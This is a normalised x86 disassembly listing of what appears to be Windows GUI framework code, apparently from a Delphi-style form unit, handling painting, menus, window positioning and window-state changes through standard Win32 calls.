mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_450b00
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_457308
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e79c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_456c55
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_456c38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41ee14
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41ecb4
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_451fe8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456c3f
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41ee14
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_450b00
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_457308
call sub_443c60
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_456d83
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e79c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_456d5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_456d3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41ee14
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41ecb4
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456d46
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41ee14
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_443c60
mov esi eax
sub_456d63
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call ReleaseDC
retn
sub_456e14
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_456e60
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45733c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_457388
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_456ea0
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_45706e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41e680
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_441914
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43cfc8
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43bdc0
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_456e14
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41e680
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_45733c
test eax eax
je r-xdata
push ebp
call sub_456e14
pop ecx
push ebp
call sub_456e14
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_456e60
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_454180
jmp r-xdata
sub_457080
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_455348
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_4570ec
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_4559e4
mov eax ebx
call sub_443f64
test al al
je r-xdata
mov eax ebx
call sub_41b0a0
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_443c60
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_440a84
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_443c60
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_41b074
call sub_451644
mov edx esi
mov eax ebx
call sub_41b074
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
sub_457184
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_457201
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_45720c
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_441200
sub_457238
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_441200
xor edx edx
jmp r-xdata
mov eax esi
call sub_4554c4
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_457270
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_43cc88
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_441200
sub_4572b4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_43cd94
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_457308
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_43a310
sub_45733c
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45aeac
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_45ae98
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_457388
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45aeac
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45ae98
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_4573d8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_413fac
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_457408
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_443c60
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_45ae7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_45ae7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_4573d8
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_45ae7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45ae68
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_414108
call sub_403124
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45ae68
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45ae68
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45ae68
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_45750c
push ebx
mov ebx eax
mov eax ebx
call sub_457504
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_424990
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_457534
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_4411b8
mov dl 0x1
mov eax esi
call sub_457898
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_457914
mov edx eax
mov eax esi
call sub_43d624
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_441354
mov dl 0x1
mov eax esi
call sub_4568b8
sub_4575b4
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_443c60
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_44dc40
mov edi eax
mov eax ebp
call sub_443c60
push eax
call DrawMenuBar
sub_457630
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_41ab4c
xor edx edx
mov eax ebx
call sub_44f5d8
sub_457654
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_4575b4
mov eax edx
mov edx ebx
call sub_41ab4c
sub_45767c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_457842
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45aeac
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_45118c
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45ae98
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_41ab4c
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45ae98
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_4038b0
mov eax ebx
call sub_443f64
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_443c60
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_4575b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457849
lea eax [ ebp - 0x10 ]
call sub_403ef8
retn
mov dl 0x1
mov eax ebx
call sub_458740
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_443f64
test al al
je r-xdata
mov eax ebx
call sub_443f64
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_443c60
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_443c60
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_443c60
mov edx eax
mov eax esi
call sub_45118c
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_443c60
push eax
call SetMenu
sub_457864
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_457850
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_4578c0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4578b4
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_45792c
push ebx
mov ebx eax
mov eax ebx
call sub_443278
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_457914
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_457914
mov edx eax
mov eax ebx
call sub_43d624
mov edx 0xff00000f
mov eax ebx
call sub_43d624
pop ebx
retn
sub_4579b0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_443c60
push eax
call ShowWindow
sub_4579f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_457408
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_457408
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_45ae7c
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45ae68
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_457408
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_45ae7c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45ae68
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab6c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab50
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab38
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab38
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab38
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab84
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab6c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab50
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab38
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab84
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab6c
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab6c
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab6c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab50
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab38
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab84
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab38
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab84
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab6c
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45ae68
call sub_45ab50
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_457d44
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_4552f8
mov edx esi
mov eax edi
call sub_45a6e8
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_457df3 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_440a84
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
